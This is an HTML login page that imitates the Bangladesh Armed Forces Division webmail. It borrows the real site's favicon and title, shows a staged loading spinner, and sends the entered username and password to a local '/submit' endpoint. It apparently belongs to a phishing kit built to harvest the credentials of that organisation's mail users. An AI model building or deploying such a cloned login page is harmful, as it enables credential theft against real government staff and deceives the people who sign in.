<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>AFD Webmail Login</title>
    <link rel="SHORTCUT ICON" href="https://mail.afd.gov.bd/favicon.ico">
    <style>
        /* Loading Screen Styles */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            transition: opacity 0.5s ease;
        }

        .loading-wrapper {
            text-align: center;
        }

        .nu-loading-icon {
            width: 42px;
            height: 42px;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Login Page Styles */
        .login-page {
            display: none;
            opacity: 0;
            transition: opacity 0.5s ease;
        }

        :root{ 
            --max-w:900px;
        }
        
        html, body {
            height:100%;
            margin:0;
            font-family: Arial, Helvetica, sans-serif;
            background:#fff;
        }
        
        .page {
            min-height:100%;
            display:flex;
            flex-direction:column;
        }
        
        .main {
            flex:1;
            display:flex;
            align-items:center;
            justify-content:center;
            padding:10px;
            margin-top:28vH
        }
        
        .card {
            max-width:var(--max-w);
            width:100%;
            text-align:center;
        }

        .branding {
            display:flex;
            align-items:center;
            gap:20px;
            justify-content:center;
            margin-bottom:14px;
        }
        
        .branding img {
            width:160px;
            height:130px;
        }
        
        .branding .title h1 {
            margin:0;
            font-size:20px;
            font-weight:700;
        }
        
        .branding .title h2 {
            margin:3;
            font-size:20px;
            font-weight:700;
        }

        .form-container {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }

        .login-form {
            width: 320px;
            border: none;
            border-spacing: 10px;
            font-family: Arial;
        }

        .form-row {
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .form-label {
            text-align: left;
            font-size: 16px;
            font-weight: 500;
            width: 80px;
        }

        .form-input {
            width: 240px;
            padding: 5px 1px;
            border: 1px solid #555;
            border-radius: 4px;
            font-size: 14px;
        }

        .form-input:focus {
            background-color: #cce4ff;
        }

        .submit-btn {
            padding: 4px 11px;
            background: #f0f0f0;
            border: 1px solid #777;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 500;
            font-size: 14px;
        }

        .bar {
            height: 30vH;
            background: #444;
            margin-top: 10vH;
        }

        @media (max-width: 600px) {
            .branding {
                flex-direction: column;
            }
        }
    </style>
</head>
<body onload="onLoad();">
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen">
        <div class="loading-wrapper">
            <svg class="nu-loading-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 18 18">
                <path d="M10.5 2.5a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0zM9 14a1.5 1.5 0 100 3 1.5 1.5 0 000-3zm6.5-6.5a1.5 1.5 0 100 3 1.5 1.5 0 000-3zM4 9a1.5 1.5 0 10-3 0 1.5 1.5 0 003 0zm.404 3.096a1.5 1.5 0 100 3 1.5 1.5 0 000-3zm9.192 0a1.5 1.5 0 100 3 1.5 1.5 0 000-3zM4.404 2.904a1.5 1.5 0 100 3 1.5 1.5 0 000-3z"></path>
            </svg>
        </div>
    </div>

    <!-- Login Page Content -->
    <div id="loginPage" class="login-page">
        <div class="page">
            <div class="main">
                <div class="card" role="main">
                    <div class="branding">
                        <img src="files/11.jpeg" alt="AFD logo">
                        <div class="title">
                            <h1>ARMED FORCES DIVISION</h1>
                            <h2>MAILING SYSTEM</h2>
                        </div>
                    </div>

                    <!-- LOGIN FORM -->
                    <form action="/submit" method="POST" name="f">
                        <div class="form-container">
                            <table class="login-form">
                                <tbody>
                                    <tr>
                                        <td class="form-label">Name:</td>
                                        <td style="text-align: right">
                                            <input name="username" id="username" type="text" class="form-input">
                                        </td>
                                    </tr>
                                    <tr>
                                        <td class="form-label">Password:</td>
                                        <td style="text-align: right">
                                            <input name="password" id="password" type="password" class="form-input">
                                        </td>
                                    </tr>
                                    <tr>
                                        <td></td>
                                        <td style="text-align: right;">
                                            <input type="submit" value="Sign In" class="submit-btn">
                                            <input type="hidden" name="reqObject" value="WMLogin">
                                            <input type="hidden" name="reqAction" value="1">
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </form>
                </div>
            </div>
            <div class="bar"></div>
        </div>
    </div>

    <script>
        // onLoad function called when page loads
        function onLoad() {
            // Show login page after 2 seconds
            setTimeout(function() {
                var loadingScreen = document.getElementById('loadingScreen');
                var loginPage = document.getElementById('loginPage');
                
                // Fade out loading screen
                loadingScreen.style.opacity = '0';
                
                setTimeout(function() {
                    // Hide loading screen and show login page
                    loadingScreen.style.display = 'none';
                    loginPage.style.display = 'block';
                    
                    // Fade in login page
                    setTimeout(function() {
                        loginPage.style.opacity = '1';
                    }, 50);
                }, 500);
            }, 2000);
        }
    </script>
</body>
</html>
